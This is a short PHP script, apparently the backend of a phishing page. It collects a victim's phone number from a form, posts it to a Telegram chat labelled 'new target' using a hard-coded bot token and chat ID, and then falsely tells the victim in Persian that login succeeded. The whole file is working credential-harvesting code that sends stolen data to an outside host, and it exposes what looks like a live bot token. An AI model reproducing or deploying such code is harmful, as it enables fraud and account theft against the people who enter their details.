<?php
$number = $_POST['number'];
if ($number == null) {
echo json_encode(array('status' => '0', 'message' => 'شماره ای که با آن ثبت نام کرده اید'));
} else {

$id = "-5066991479";  // chatId Admin
$token = '6980095826:AAGWcMZEsViOpSb0z-HrvzxzSMWKPrN8BMU';  // robot Token
$des = "  
تارگت جدید 👺
➖➖➖➖➖➖➖
شماره : <code>$number</code>
➖➖➖➖➖➖➖
";
    $send = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $id . "&text=" . urlencode($des) . '&parse_mode=HTML';
    $params = [
'chat_id' => $id,
'text' => $des,
'parse_mode' => 'HTML'
];
    $website = "https://api.telegram.org/bot" . $token;
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
      echo json_encode(array('status' => '1', 'message' => 'ورود موفقیت آمیز بود'));
}


